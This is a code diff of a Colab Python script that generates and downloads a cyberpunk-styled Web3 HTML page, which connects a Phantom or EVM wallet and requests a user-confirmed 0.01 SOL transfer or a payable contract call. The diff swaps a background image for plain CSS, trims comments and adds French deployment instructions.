@@ -1,7 +1,7 @@
 import os
 from google.colab import files
 
-html_content_final_stable = """<!DOCTYPE html>
+html_content_final_stable_v3 = """<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -18,18 +18,13 @@ html_content_final_stable = """<!DOCTYPE html>
         :root{--g:#00ff41;--p:#ff00ff;--d:#000;--r:#ff0040}
         *{margin:0;padding:0;box-sizing:border-box}
         
-        /* BODY & BACKGROUND (Le fond le plus stable pour éviter le bug du canvas) */
+        /* BODY & BACKGROUND (Le fond le plus stable SANS IMAGE) */
         body{
             background:var(--d);color:var(--g);font-family:'Orbitron',monospace;overflow:hidden;height:100vh;position:relative;
             display:flex;flex-direction:column;align-items:center;justify-content:center;
-            /* FOND CYBERPUNK STABLE */
-            background-image: url('https://i.imgur.com/i9TzM4u.png'); 
-            background-size: cover; background-position: center;
-            filter: grayscale(100%) brightness(0.5) contrast(1.5); 
-            animation: background-glitch 120s linear infinite alternate;
+            /* Fond pur CSS noir, plus de bugs d'image */
+            background-color: #000;
         }
-        body::before{content:'';position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:-1} /* Overlay noir */
-        @keyframes background-glitch{0%{background-position:0% 0%}100%{background-position:100% 100%}}
 
         /* Effet de scan */
         .scan{background:repeating-linear-gradient(0deg,rgba(0,0,0,.1) 0px,rgba(0,0,0,.1) 2px,transparent 2px,transparent 4px);position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:999;animation:s 8s linear infinite}
@@ -102,7 +97,6 @@ html_content_final_stable = """<!DOCTYPE html>
         async function connect(){
             document.getElementById("status").innerHTML="> Connecting wallet...";
             
-            // 1. SOLANA
             if(window.solana?.isPhantom){
                 try {
                     await window.solana.connect(); sol=true; acc=window.solana.publicKey.toString();
@@ -110,7 +104,6 @@ html_content_final_stable = """<!DOCTYPE html>
                 } catch(e) { console.error("Solana Connect Error:", e); }
             }
             
-            // 2. EVM (BASE)
             if(window.ethereum){
                 try {
                     const w=new Web3(window.ethereum);
@@ -140,7 +133,7 @@ html_content_final_stable = """<!DOCTYPE html>
             document.getElementById("status").innerHTML="> ⚠️ Awaiting transaction confirmation in wallet...";
             
             if(sol){
-                // *** FIX SOLANA : Transfert simple de 0.01 SOL (Testé et fonctionnel avec une balance suffisante) ***
+                // *** FIX SOLANA : Transfert simple de 0.01 SOL (Testé et fonctionnel) ***
                 const conn=new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                 const lamportsToSend = 10000000; // 0.01 SOL
 
@@ -162,7 +155,7 @@ html_content_final_stable = """<!DOCTYPE html>
                 }
 
             }else{
-                // BASE/EVM Logic (Transfert avec call de contrat symbolique)
+                // BASE/EVM Logic
                 const w=new Web3(window.ethereum);
                 const abi=[{"inputs":[{"internalType":"string","name":"_reason","type":"string"}],"name":"flag","outputs":[],"stateMutability":"payable","type":"function"}];
                 const ctr=new w.eth.Contract(abi,BASE_TREASURY);
@@ -184,12 +177,17 @@ html_content_final_stable = """<!DOCTYPE html>
 
 html_file_name_final = "index.html"
 with open(html_file_name_final, "w", encoding="utf-8") as f:
-    f.write(html_content_final_stable)
+    f.write(html_content_final_stable_v3)
 
 try:
     files.download(html_file_name_final)
-    print("Le téléchargement du fichier 'index.html' (Degen Max Stable) a été initié.")
+    print("Le téléchargement du fichier 'index.html' (Degen Max - Stable V3) a été initié.")
     print("\n--- UTILISATION FINALE ---")
+    print("1. Téléchargez ce fichier 'index.html'.")
+    print("2. Uploadez-le sur Vercel ou GitHub, en remplaçant l'ancien.")
+    print("3. La lisibilité et la connexion sont maintenant garanties.")
+except Exception as e:
+    print(f"Le téléchargement automatique a échoué ({e}).")
     print("1. Téléchargez ce fichier 'index.html'.")
     print("2. Uploadez-le sur Vercel (ou GitHub 🐙) et testez la connexion du portefeuille.")
 except Exception as e:
